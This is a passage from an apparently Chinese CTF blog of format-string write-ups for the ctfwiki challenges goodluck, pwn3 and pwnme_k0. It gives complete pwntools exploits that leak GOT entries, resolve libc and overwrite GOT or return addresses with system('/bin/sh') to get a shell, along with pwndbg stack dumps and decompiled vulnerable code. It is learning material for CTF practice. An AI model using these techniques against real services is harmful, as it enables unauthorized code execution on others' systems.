Wo│rld │agai│n, ·│ 00000060 2f 66 a7 cc 7f 21 0a │/f··│·!·│ 00000067Welcome to the Pwn World again, �/f��! 结合题目 结尾一个叹号一个换行符 看似麻烦 其实我们知道我们所需的地址开头是0x7f 那么可以从0x7f开始往回6个 1read_addr = u64(sh.recvuntil(b&#x27;\\\\\\\\x7f&#x27;)[-6:].ljust(8,&#x27;\\\\\\\\0&#x27;)) 不过注意此时是recvuntil 另外还有一个玄学问题 这题用的printf打印got表需要加个参数%s 不然跑不通 于是借了一下main里的那句话","categories":[{"name":"Stack/Basic","slug":"Stack-Basic","permalink":"https://dawoxiansigema.github.io/categories/Stack-Basic/"}],"tags":[]},{"title":"Fomatstring","slug":"Fomatstring","date":"2023-10-31T13:36:34.000Z","updated":"2023-10-31T13:42:54.467Z","comments":true,"path":"2023/10/31/Fomatstring/","link":"","permalink":"https://dawoxiansigema.github.io/2023/10/31/Fomatstring/","excerpt":"ctfwiki格式化字符串部分题解","text":"ctfwiki格式化字符串部分题解 goodluck特殊情况这道题比较特殊 一般的题目是不会把flag加载进堆栈中的 在printf结束时断下时 1234567891011pwndbg&gt; stack 5000:0000│ rsp 0x7fffffffe568 —▸ 0x400890 (main+234) ◂— mov edi, 0x4009b801:0008│ 0x7fffffffe570 ◂— 0x6100000102:0010│ 0x7fffffffe578 —▸ 0x602ca0 ◂— 0x61616161 /* &#x27;aaaa&#x27; */03:0018│ 0x7fffffffe580 —▸ 0x6022a0 ◂— 0x004:0020│ 0x7fffffffe588 —▸ 0x7fffffffe590 ◂— 0x7365747b47414c46 (&#x27;FLAG&#123;tes&#x27;)05:0028│ 0x7fffffffe590 ◂— 0x7365747b47414c46 (&#x27;FLAG&#123;tes&#x27;)06:0030│ 0x7fffffffe598 ◂— 0xffff0a7d3332317407:0038│ 0x7fffffffe5a0 ◂— 0xffffffffffff08:0040│ 0x7fffffffe5a8 ◂— 0x9252308373e5500009:0048│ rbp 0x7fffffffe5b0 ◂— 0x0 那么对于此题而言确实是比较刚好 只需要判断0x7fffffffe588是printf的第几个参数即可 由于是64位的缘故 还有6个寄存器 6+4-1&#x3D;9 只需要输入%9$s即可 也可以用fmtarg 12pwndbg&gt; fmtarg 0x7fffffffe588The index of format argument : 10 (&quot;\\\\%9$p&quot;) 关于这种情况的就记录到此 毕竟在比赛中极少见 最后print一下即可 12345from pwn import *sh = process(&#x27;./goodluck&#x27;)payload = &#x27;%9$s&#x27;sh.sendline(payload)print sh.recv() 一般情况对于一般情况 我们先分别拿32位和64位举个例子 1234567#include &lt;stdio.h&gt;int main()&#123; char a[100]; scanf(&quot;%s&quot;,a); printf(a); return 0;&#125; 注意一点 无论是32位还是64位而言 payload的输入都得通过exp执行 手工输入会造成输入字符串不分组 无法提取所需数据 对于32位程序而言 情况和ctfwiki上面的差不多 12345678910111213from pwn import *sh = process(&#x27;./32&#x27;)elf = ELF(&#x27;./32&#x27;)#context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]gdb.attach(sh)__isoc99_scanf_got = elf.got[&#x27;__isoc99_scanf&#x27;]print (hex(__isoc99_scanf_got))payload = p32(__isoc99_scanf_got) + &#x27;@@%7$s@@&#x27;print (payload) sh.sendline(payload)sh.recvuntil(&#x27;@@&#x27;)print hex(u32(sh.recv(4))) 由于手工输入payload无法观察真实情况栈结构 我们使用gdb.attach()函数 请注意 如果有读者和我一样使用的是pwndocker 那么得装个tmux docker内启动tmux 并设置context.terminal如上 在运行后需在gdb内设置printf函数断点 1234567891011121314pwndbg&gt; stack 25│00:0000│ esp 0xff9bc7bc —▸ 0x80484c5 (main+63) ◂— add esp, 0x10│01:0004│ 0xff9bc7c0 —▸ 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │02:0008│ 0xff9bc7c4 —▸ 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │03:000c│ 0xff9bc7c8 —▸ 0xf7fc7990 ◂— 0x0│04:0010│ 0xff9bc7cc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b63│05:0014│ 0xff9bc7d0 ◂— 0x0│06:0018│ 0xff9bc7d4 ◂— 0xc30000│07:001c│ 0xff9bc7d8 ◂— 0x1│08:0020│ eax 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │09:0024│ 0xff9bc7e0 ◂— &#x27;@@%7$s@@&#x27;│0a:0028│ 0xff9bc7e4 ◂— &#x27;$s@@&#x27;│0b:002c│ 0xff9bc7e8 —▸ 0xf7fc7000 ◂— 0x2bf24│0c:0030│ 0xff9bc7ec ◂— 0x0 可以看到从0xff9bc7dc开始 将payload分割为几个4字节进行存储 这样结合%7$s就很好明白了 对于@@@@的话 相当于打个标签吧 不过记得加上recvuntil() 1234567DEBUG] Sent 0xd bytes: 00000000 14 a0 04 08 40 40 25 37 24 73 40 40 0a │····│@@%7│$s@@│·│ 0000000d[*] Process &#x27;./32&#x27; stopped with exit code 0 (pid 39281)[DEBUG] Received 0xc bytes: 00000000 14 a0 04 08 40 40 a0 03 d9 f7 40 40 │····│@@··│··@@│ 0000000c 还有一个要注意的点就是 对于我们想要获取的got表 地址不能以00结尾 可以用这句查看 1print hex(libc.symbols[&#x27;scanf&#x27;]) 对于32位而言 情况十分常规 但是此法在64位系统中略有不同 因为在64位系统中 虚拟内存的高16位永远是赋值为0 拿got表举例 12345678910pwndbg&gt; got/ctf/work/64: file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE 0000000000600ff0 R_X86_64_GLOB_DAT __libc_start_main@GLIBC_2.2.50000000000600ff8 R_X86_64_GLOB_DAT __gmon_start__0000000000601018 R_X86_64_JUMP_SLOT printf@GLIBC_2.2.50000000000601020 R_X86_64_JUMP_SLOT __isoc99_scanf@GLIBC_2.7 可以看到开头全是0 那么如果还是以got表地址打头 会直接导致后面的%n$s被截断 那么我们得把它反过来写 并且我们选择时也不能选择结尾为0的got表 不然一样会造成截断 1payload = &#x27;@@%7$s@@&#x27;.ljust(0x20,&#x27;a&#x27;) + p64(printf_got) 请注意 当你把got表地址放后面时 会导致所在参数位置的改变 此时我们需要重新设置一遍 不过既然涉及到这个问题 我们在输入时就必须注意padding的问题 我们必须让got表地址处于一个单独的栈单元内 这就需要我们对齐 32位不需要对齐是因为4字节比较少出现没对齐的情况 12345678pwndbg&gt; stack 25│00:0000│ rsp 0x7ffd8ffca558 —▸ 0x400588 (main+49) ◂— mov eax, 0│01:0008│ rdi 0x7ffd8ffca560 ◂— 0x4073243031254040 (&#x27;@@%10$s@&#x27;)│02:0010│ 0x7ffd8ffca568 ◂— 0x6161616161616140 (&#x27;@aaaaaaa&#x27;)│03:0018│ 0x7ffd8ffca570 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)│04:0020│ 0x7ffd8ffca578 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)│05:0028│ 0x7ffd8ffca580 —▸ 0x601018 (printf@got.plt) —▸ 0x7f8192b24cc0 (printf) ◂— endbr64 │06:0030│ 0x7ffd8ffca588 —▸ 0x7ffd8ffca500 ◂— 0x0 可以看到 如上是实现栈对齐后的效果 fmtarg即可确定参数位置 1fmtarg 0x7ffd8ffca580 最后就是输出 我们输入时可以看到我们的地址是6字节 然而我们输入的padding是会跟着输出的 格式也是打包好的 并且还有一堆乱七八糟的东西 1�&lt;\\\\xff��~@@aaaaaaaaaaaaaaaaaaaaaaa\\\\x18` 我们要前6字节 但是u64解包需要8字节 故exp如下 1234567891011121314from pwn import *sh = process(&#x27;./64&#x27;)elf = ELF(&#x27;./64&#x27;)context.log_level = &#x27;debug&#x27;libc = elf.libccontext.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]gdb.attach(sh)printf_got = elf.got[&#x27;printf&#x27;] print (hex(printf_got))payload = &#x27;@@%10$s@@&#x27;.ljust(0x20,&#x27;a&#x27;) + p64(printf_got)print (payload) sh.sendline(payload)sh.recvuntil(&#x27;@@&#x27;)print hex(u64(sh.recv(6).ljust(8,&quot;\\\\x00&quot;))) 我们最后回到goodluck那题 可惜就算这样他也还是不给我机会 只有关于flag的栈 耻辱下播 pwn这题对于初学的我还是有点难度的 值得学习 此情况只有在部分reload时才可使用 准备工作1234567891011121314151617181920212223242526272829303132int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; signed int v3; // eax char s1; // [esp+14h] [ebp-2Ch] int v5; // [esp+3Ch] [ebp-4h] setbuf(stdout, 0); ask_username(&amp;s1); ask_password(&amp;s1); while ( 1 ) &#123; while ( 1 ) &#123; print_prompt(); v3 = get_command(); v5 = v3; if ( v3 != 2 ) break; put_file(); &#125; if ( v3 == 3 ) &#123; show_dir(); &#125; else &#123; if ( v3 != 1 ) exit(1); get_file(); &#125; &#125;&#125; main函数大致了解过程 输入username和password 然后选择一项服务 此题有三个重要的子函数 分别是put_file get_file show_dir 在此之前先说一下password函数 123456789int __cdecl ask_password(char *s1)&#123; if ( strcmp(s1, &quot;sysbdmin&quot;) ) &#123; puts(&quot;who you are?&quot;); exit(1); &#125; return puts(&quot;welcome!&quot;);&#125; 这个strcmp有点东西 如果比较发现相等 返回值为0 而这个s1是username传来的 123456789101112131415_DWORD *put_file()&#123; _DWORD *v0; // ST1C_4 _DWORD *result; // eax v0 = malloc(0xF4u); printf(&quot;please enter the name of the file you want to upload:&quot;); get_input((int)v0, 40, 1); printf(&quot;then, enter the content:&quot;); get_input((int)(v0 + 10), 200, 1); v0[60] = file_head; result = v0; file_head = (int)v0; return result;&#125; 对于put_file而言 此函数首先申请一段内存空间 v0是指向开头的指针 两个get_input分别对v0所在空间输入40 200个字节数据 并且在v0的最后位置存储一个file_head值 在最初该值为0是因为file_head处于bss段 不过在每次调用put_file的最后 file_head都会被赋值为v0指针 因此在多次调用put_file时 会形成一个链栈结构 1234567891011121314151617181920int get_file()&#123; char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(&quot;enter the file name you want to get:&quot;); __isoc99_scanf(&quot;%40s&quot;, &amp;s1); if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) ) puts(&quot;too young, too simple&quot;); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) &#123; if ( !strcmp(i, &amp;s1) ) &#123; strcpy(&amp;dest, i + 40); return printf(&amp;dest); &#125; &#125; return printf(&amp;dest);&#125; get_file则是格式化字符串漏洞的触发函数 不过逻辑很简单就是了 把输入名字所在的那个链栈内容复制一下 然后printf 这倒是简单 123456789101112131415161718192021int show_dir()&#123; int v0; // eax char s[1024]; // [esp+14h] [ebp-414h] int i; // [esp+414h] [ebp-14h] int j; // [esp+418h] [ebp-10h] int v5; // [esp+41Ch] [ebp-Ch] v5 = 0; j = 0; bzero(s, 0x400u); for ( i = file_head; i; i = *(_DWORD *)(i + 240) ) &#123; for ( j = 0; *(_BYTE *)(i + j); ++j ) &#123; v0 = v5++; s[v0] = *(_BYTE *)(i + j); &#125; &#125; return puts(s);&#125; show_dir这个函数比较有意思 表面上看它也还是和get_file一样输出链栈内容 不过当我进行测试之后发现不太一样 123456789101112131415161718pwndbg&gt; rStarting program: /ctf/work/pwn3 Connected to ftp.hacker.server220 Serv-U FTP Server v6.4 for WinSock ready...Name (ftp.hacker.server:Rainism):rxraclhmwelcome!ftp&gt;putplease enter the name of the file you want to upload:123then, enter the content:abcftp&gt;put please enter the name of the file you want to upload:321 then, enter the content:bcaftp&gt;dir321123ftp&gt;getenter the file name you want to get:123abcftp&gt;dir321123 get_file是输入put_file所输入的文件名 输出对应文件内容 而show_dir就只输出文件名(直到写wp时才明白这个show_dir名字是这个意思 HIJACK GOT没有明显的flag痕迹 也没有明显的条件判断来执行shell等 那么尝试一波劫持got 将某个函数地址改为system的 1get_file() put_file() show_dir() 能用到的也就这三个函数 put_file目前发现格式化字符串漏洞 但是get与dir都没有明显漏洞 在get_file中利用漏洞进行got表劫持是可以做到的 但是got表劫持所修改的函数必须要在后面被调用 而且system的话 还需要&#x2F;bin&#x2F;sh;参数 才能形成system(’&#x2F;bin&#x2F;sh;’)的shell 123456789101112131415161718192021int show_dir()&#123; int v0; // eax char s[1024]; // [esp+14h] [ebp-414h] int i; // [esp+414h] [ebp-14h] int j; // [esp+418h] [ebp-10h] int v5; // [esp+41Ch] [ebp-Ch] v5 = 0; j = 0; bzero(s, 0x400u); for ( i = file_head; i; i = *(_DWORD *)(i + 240) ) &#123; for ( j = 0; *(_BYTE *)(i + j); ++j ) &#123; v0 = v5++; s[v0] = *(_BYTE *)(i + j); &#125; &#125; return puts(s);&#125; 回到show_dir函数中 我们已经知道他只输出文件名 那么说明s我们是可控的 只需要put时输入即可 那么我们如果将puts的地址劫持 修改为system地址 即可实现getshell EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *from LibcSearcher import LibcSearchersh = process(&quot;./pwn3&quot;)elf = ELF(&#x27;./pwn3&#x27;)context.log_level = &#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]tmp = &#x27;sysbdmin&#x27;name = &quot;&quot;for i in tmp: name += chr(ord(i)-1)def password(): sh.recvuntil(&#x27;Name (ftp.hacker.server:Rainism):&#x27;) sh.sendline(name)def put(name,payload): sh.sendline(&#x27;put&#x27;) sh.recvuntil(&#x27;please enter the name of the file you want to upload:&#x27;) sh.sendline(name) sh.recvuntil(&#x27;then, enter the content:&#x27;) sh.sendline(payload)def get(name): sh.sendline(&#x27;get&#x27;) sh.recvuntil(&quot;enter the file name you want to get:&quot;) sh.sendline(name) data = sh.recv() return data#gdb.attach(sh)password()puts_got = elf.got[&#x27;puts&#x27;]payload = &#x27;%8$s&#x27; + p32(puts_got)put(&#x27;1111&#x27;,payload)#puts_addr = u32(get(&#x27;1111&#x27;)[:4])puts_addr = u32(get(&#x27;1111&#x27;)[:4])#print hex(puts_addr)libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)system_offset = libc.dump(&#x27;system&#x27;)puts_offset = libc.dump(&#x27;puts&#x27;)system_addr = puts_addr - puts_offset + system_offsetlog.success(&#x27;system addr:&#x27; + hex(system_addr))payload = fmtstr_payload(7,&#123;puts_got:system_addr&#125;)put(&#x27;/bin/sh;&#x27;,payload)sh.recvuntil(&#x27;ftp&gt;&#x27;)get(&#x27;/bin/sh;&#x27;)sh.sendline(&#x27;dir&#x27;)sh.interactive() 不过 在编写EXP时 遇到了许多坑 首先是栈中参数位置的确定 12345678910│00:0000│ esp 0xffa77aa0 —▸ 0xffa77abc ◂— 0x73243825 (&#x27;%8$s&#x27;)│01:0004│ 0xffa77aa4 —▸ 0x90521d8 ◂— 0x73243825 (&#x27;%8$s&#x27;)│02:0008│ 0xffa77aa8 ◂— 0x4│03:000c│ 0xffa77aac —▸ 0xf7dc226c ◂— 0x3787│04:0010│ 0xffa77ab0 —▸ 0xf7fa0a74 ◂— 0x0│05:0014│ 0xffa77ab4 ◂— 0x7d4│06:0018│ 0xffa77ab8 —▸ 0xf7fa02a0 (_IO_helper_jumps) ◂— 0x0│07:001c│ eax edx 0xffa77abc ◂— 0x73243825 (&#x27;%8$s&#x27;)│08:0020│ 0xffa77ac0 —▸ 0x804a028 (puts@got.plt) —▸ 0xf7e24c30 (puts) ◂— endbr32 │09:0024│ 0xffa77ac4 —▸ 0x8048c00 ◂— push ebx /* &#x27;Serv-U FTP Server v6.4 for WinSock ready...&#x27; */ 这是put完之后 运行到get时printf处的断点 可以看到此处的堆栈略有不同 我们首先使用fmtarg 12pwndbg&gt; fmtarg 0xffa77ac0The index of format argument : 8 (&quot;\\\\%7$p&quot;) 正常来说 我们设置的参数位置应该是%7$p 但是若真用7 那么定位到的内容是%7$s它本身 修改部分代码如下 1234567891011121314151617181920212223242526272829303132333435363738def get(name): sh.sendline(&#x27;get&#x27;) sh.recvuntil(&quot;enter the file name you want to get:&quot;) sh.sendline(name) data = sh.recv() return datapassword()puts_got = elf.got[&#x27;puts&#x27;]payload = &#x27;%7$p&#x27; + p32(puts_got)print payloadput(&#x27;1111&#x27;,payload)gdb.attach(sh)print get(&#x27;1111&#x27;)│00:0000│ esp 0xffa94b60 —▸ 0xffa94b7c ◂— 0x70243725 (&#x27;%7$p&#x27;)│01:0004│ 0xffa94b64 —▸ 0x82791d8 ◂— 0x70243725 (&#x27;%7$p&#x27;)│02:0008│ 0xffa94b68 ◂— 0x4│03:000c│ 0xffa94b6c —▸ 0xf7d4f26c ◂— 0x3787│04:0010│ 0xffa94b70 —▸ 0xf7f2da74 ◂— 0x0│05:0014│ 0xffa94b74 ◂— 0x7d4│06:0018│ 0xffa94b78 —▸ 0xf7f2d2a0 (_IO_helper_jumps) ◂— 0x0│07:001c│ eax edx 0xffa94b7c ◂— 0x70243725 (&#x27;%7$p&#x27;)│08:0020│ 0xffa94b80 —▸ 0x804a028 (puts@got.plt) —▸ 0xf7db1c30 (puts) ◂— endbr32root@5c3176a78240:/ctf/work# python2 exp.py[+] Starting local process &#x27;./pwn3&#x27;: pid 59656[*] &#x27;/ctf/work/pwn3&#x27; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)%7$p(\\\\xa0\\\\x04[*] running in new terminal: /usr/bin/gdb -q &quot;./pwn3&quot; 59656[+] Waiting for debugger: Done0x70243725(\\\\xa0\\\\x04ftp&gt;[*] Stopped process &#x27;./pwn3&#x27; (pid 59656) 可以看到 确实是0x70243725 不过为啥会这样我也不是很确定 1234567891011121314pwndbg&gt; stack 25│00:0000│ esp 0xff9bc7bc —▸ 0x80484c5 (main+63) ◂— add esp, 0x10│01:0004│ 0xff9bc7c0 —▸ 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │02:0008│ 0xff9bc7c4 —▸ 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │03:000c│ 0xff9bc7c8 —▸ 0xf7fc7990 ◂— 0x0│04:0010│ 0xff9bc7cc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b63│05:0014│ 0xff9bc7d0 ◂— 0x0│06:0018│ 0xff9bc7d4 ◂— 0xc30000│07:001c│ 0xff9bc7d8 ◂— 0x1│08:0020│ eax 0xff9bc7dc —▸ 0x804a014 (__isoc99_scanf@got.plt) —▸ 0xf7ded3a0 (__isoc99_scanf) ◂— endbr32 │09:0024│ 0xff9bc7e0 ◂— &#x27;@@%7$s@@&#x27;│0a:0028│ 0xff9bc7e4 ◂— &#x27;$s@@&#x27;│0b:002c│ 0xff9bc7e8 —▸ 0xf7fc7000 ◂— 0x2bf24│0c:0030│ 0xff9bc7ec ◂— 0x0 这是之前那个32位例子的栈结构 比较一下可以看到 此题的栈结构中缺少第一个main的返回地址 因为fmtarg是使用该地址与esp地址的差值进行计算的 所以参数可+1 不过我不是很确定 属于卡住的时候可以验证一下 1payload = fmtstr_payload(7,&#123;puts_got:system_addr&#125;) 然后是这句payload的目的是将puts的got表地址 修改为system的函数地址 不过该部分的参数不知道为什么又变成7了 应该是要与fmtarg函数返回的一样 HIJACK RETADDR这题还可以用函数调用栈的方式来做 12345678910111213.text:080487F6 get_file proc near ; CODE XREF: main+57↑p.text:080487F6.text:080487F6 dest = byte ptr -0FCh.text:080487F6 s1 = byte ptr -34h.text:080487F6 var_C = dword ptr -0Ch.text:080487F6.text:080487F6 ; __unwind &#123;.text:080487F6 push ebp.text:080487F7 mov ebp, esp.text:080487F9 sub esp, 118h.text:080487FF mov dword ptr [esp], offset aEnterTheFileNa ; &quot;enter the file name you want to get:&quot;.text:08048806 call _printf.text:0804880B lea eax, [ebp+s1] 这是get_file的汇编代码 可以看到他先是入栈ebp 然后移动esp并空出118h的栈空间 这是函数调用时的操作 那么对于目前的格式化字符串漏洞而言 ebp所在地址距离esp有118h 也就是280 那么280&#x2F;4 &#x3D; 70 那么我们取第70个参数就能获取到get_file函数的ebp地址 123│46:0118│ ebp 0xff817f38 —▸ 0xff817f88 ◂— 0x0pwndbg&gt; fmtarg 0xff817f38|The index of format argument : 70 (&quot;\\\\%69$p&quot;) 结合之前对于参数的判断 确实第70个(实在不行再改成69) 复习一下 ebp是在call之后入栈的 而retaddr则是在call时就入栈的 二者不一样 我们此时获取的ebp是main函数(caller)的ebp 具体去结合函数调用栈的知识 12345Breakpoint 3, 0x08048670 in main ()pwndbg&gt; stack 2500:0000│ ebp esp 0xffffd6e8 ◂— 0x001:0004│ 0xffffd6ec —▸ 0xf7decee5 (__libc_start_main+245) ◂— add esp, 0x1002:0008│ 0xffffd6f0 ◂— 0x1 这是我在main函数处下的断点 请记住此时的ebp 至于为啥会出现esp和ebp在一起的情况 主要还是具体情况具体分析 12345643:010c│ 0xffffd68c ◂— 0x044:0110│ 0xffffd690 —▸ 0xf7fbdd20 (_IO_2_1_stdout_) ◂— 0xfbad288745:0114│ 0xffffd694 —▸ 0xf7ffd990 ◂— 0x046:0118│ ebp 0xffffd698 —▸ 0xffffd6e8 ◂— 0x047:011c│ 0xffffd69c —▸ 0x80486c9 (main+92) ◂— jmp 0x80486e548:0120│ 0xffffd6a0 —▸ 0xffffd6b4 ◂— &#x27;sysbdmin&#x27; 这是我在get_file处下断点获取的ebp值 可以看到此处的ebp有个箭头 箭头后的值正是main(caller)的ebp 这说明此时ebp指针的位置是0xffffd698 栈开始的地方是这个地址 该地址存储的是旧的(caller)的ebp值 多个调用的话情况类推 123│46:0118│ ebp 0xffa13918 —▸ 0xffa13968 ◂— 0x0│47:011c│ 0xffa1391c —▸ 0x80486c9 (main+92) ◂— jmp 0x80486e5│48:0120│ 0xffa13920 —▸ 0xffa13934 ◂— &#x27;sysbdmin&#x27; 不过需要注意的是 我们获取的ebp的值是main函数的ebp值 他的值与当前的retaddr永远存在0x4c的差值 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *from LibcSearcher import LibcSearchersh = process(&quot;./pwn3&quot;)elf = ELF(&#x27;./pwn3&#x27;)#context.log_level = &#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]tmp = &#x27;sysbdmin&#x27;name = &quot;&quot;for i in tmp: name += chr(ord(i)-1)def password(): sh.recvuntil(&#x27;Name (ftp.hacker.server:Rainism):&#x27;) sh.sendline(name)def put(name,payload): sh.sendline(&#x27;put&#x27;) sh.recvuntil(&#x27;please enter the name of the file you want to upload:&#x27;) sh.sendline(name) sh.recvuntil(&#x27;then, enter the content:&#x27;) sh.sendline(payload)def get(name): sh.sendline(&#x27;get&#x27;) sh.recvuntil(&quot;enter the file name you want to get:&quot;) sh.sendline(name) data = sh.recv() return data#gdb.attach(sh)password()printf_got = elf.got[&#x27;printf&#x27;]payload = &#x27;%8$s&#x27; + p32(printf_got)put(&#x27;1111&#x27;,payload)#puts_addr = u32(get(&#x27;1111&#x27;)[:4])printf_addr = u32(get(&#x27;1111&#x27;)[:4])#print hex(puts_addr)libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)printf_offset = libc.dump(&#x27;printf&#x27;)system_offset = libc.dump(&#x27;system&#x27;)bin_sh_offset = libc.dump(&#x27;str_bin_sh&#x27;)system_addr = printf_addr - printf_offset + system_offsetbin_sh_addr = printf_addr - printf_offset + bin_sh_offsetput(&#x27;getEbp&#x27;,b&#x27;%70$p a&#x27;)tmp = get(&#x27;getEbp&#x27;)ebp = int(tmp.split()[0],16)ret_addr = ebp -0x4cpayload = fmtstr_payload(7, &#123;ret_addr + 8: bin_sh_addr&#125;)put(&#x27;setSH&#x27;, payload)get(&#x27;setSH&#x27;)payload = fmtstr_payload(7, &#123;ret_addr: system_addr&#125;)put(&#x27;setSy&#x27;, payload)get(&#x27;setSy&#x27;)sh.interactive() HIJACK RETADDR 2.0在解题的过程中也发现 其实也可以利用esp进行getshell 在比较特殊的情况中 劫持ebp可能会出现程序崩溃的情况 这个时候也可以劫持esp 因为在调用完了以后eip会走到esp的上面(高4字节 1234.text:0804866D push ebp.text:0804866E mov ebp, esp.text:08048670 and esp, 0FFFFFFF0h.text:08048673 sub esp, 40h 这是main开始对esp的操作 我们也可以在python中实现 大体不变 exp如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *from LibcSearcher import LibcSearchersh = process(&quot;./pwn3&quot;)elf = ELF(&#x27;./pwn3&#x27;)#context.log_level = &#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]tmp = &#x27;sysbdmin&#x27;name = &quot;&quot;for i in tmp: name += chr(ord(i)-1)def password(): sh.recvuntil(&#x27;Name (ftp.hacker.server:Rainism):&#x27;) sh.sendline(name)def put(name,payload): sh.sendline(&#x27;put&#x27;) sh.recvuntil(&#x27;please enter the name of the file you want to upload:&#x27;) sh.sendline(name) sh.recvuntil(&#x27;then, enter the content:&#x27;) sh.sendline(payload)def get(name): sh.sendline(&#x27;get&#x27;) sh.recvuntil(&quot;enter the file name you want to get:&quot;) sh.sendline(name) data = sh.recv() return data#gdb.attach(sh)password()printf_got = elf.got[&#x27;printf&#x27;]payload = &#x27;%8$s&#x27; + p32(printf_got)put(&#x27;1111&#x27;,payload)#puts_addr = u32(get(&#x27;1111&#x27;)[:4])printf_addr = u32(get(&#x27;1111&#x27;)[:4])#print hex(puts_addr)libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)printf_offset = libc.dump(&#x27;printf&#x27;)system_offset = libc.dump(&#x27;system&#x27;)bin_sh_offset = libc.dump(&#x27;str_bin_sh&#x27;)system_addr = printf_addr - printf_offset + system_offsetbin_sh_addr = printf_addr - printf_offset + bin_sh_offsetput(&#x27;getEbp&#x27;,b&#x27;%70$p a&#x27;)tmp = get(&#x27;getEbp&#x27;)ebp = int(tmp.split()[0],16)esp = (ebp &amp; 0x0FFFFFFF0) - 0x40ret_addr = ebp -0x4cpayload = fmtstr_payload(7, &#123;esp + 4: bin_sh_addr&#125;)put(&#x27;setSH&#x27;, payload)get(&#x27;setSH&#x27;)payload = fmtstr_payload(7, &#123;esp - 4: system_addr&#125;)put(&#x27;setSy&#x27;, payload)get(&#x27;setSy&#x27;)sh.interactive() 当然这种情况就要具体问题具体分析了 pwnme_k0其实会了上面的那题的hijack retaddr的话 这题就很简单了 只不过他是64位的 fmtstr_payload就不能用了 得覆盖大数字 123│01:0008│ rbp 0x7fffe630b620 —▸ 0x7fffe630b660 —▸ 0x7fffe630b710 ◂— 0x0│02:0010│ 0x7fffe630b628 —▸ 0x400d74 ◂— add rsp, 0x30│03:0018│ rdi 0x7fffe630b630 ◂— &#x27;aaaaaaaa\\\\n&#x27; 0x7fffe630b660 - 0x7fffe630b628 &#x3D; 0x38 接下来需要获取返回地址 1234567.text:00000000004008A6 sub_4008A6 proc near.text:00000000004008A6 ; __unwind &#123;.text:00000000004008A6 push rbp.text:00000000004008A7 mov rbp, rsp.text:00000000004008AA mov edi, offset command ; &quot;/bin/sh&quot;.text:00000000004008AF call system.text:00000000004008B4 pop rdi 所以还需要覆盖后三位即可 或者全覆盖也行 120x4008A6 ---&gt; &#x27;4196518d%11$hn&#x27;0x8A6 ---&gt; &#x27;2214d%11$hn&#x27; 默认情况都是从尾端开始覆盖的 123A%11$hhn ---&gt; 0x88888801A%11$hn ---&gt; 0x88880001A%11$n ---&gt; 0x00000001 题目分析就略过了 逻辑比较简单 exp如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *sh = process(&#x27;./pwnme_k0&#x27;)context.log_level = &#x27;debug&#x27;#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]def reg(name,passwd): sh.recvuntil(&#x27;Input your username(max lenth:20):&#x27;) sh.sendline(name) sh.recvuntil(&#x27;Input your password(max lenth:20):&#x27;) sh.sendline(passwd)def show(): sh.sendline(&#x27;1&#x27;)def update(name,payload): sh.sendline(&#x27;2&#x27;) sh.recvuntil(&#x27;please input new username(max lenth:20):&#x27;) sh.sendline(name) sh.recvuntil(&#x27;please input new password(max lenth:20):&#x27;) sh.sendline(payload)#gdb.attach(sh)name = &#x27;aaaaaaaa&#x27;passwd = &#x27;%6$p&#x27;reg(name,passwd)sh.recvuntil(&#x27;&gt;&#x27;)show()#ebp = int(sh.recv()[11:25],16)#print ebpsh.recvuntil(&quot;0x&quot;)ret_addr = int(sh.recvline().strip(),16) - 0x38#ret_addr = ebp - 0x38print hex(ret_addr)payload = &#x27;4196518d%11$hn&#x27;payload += 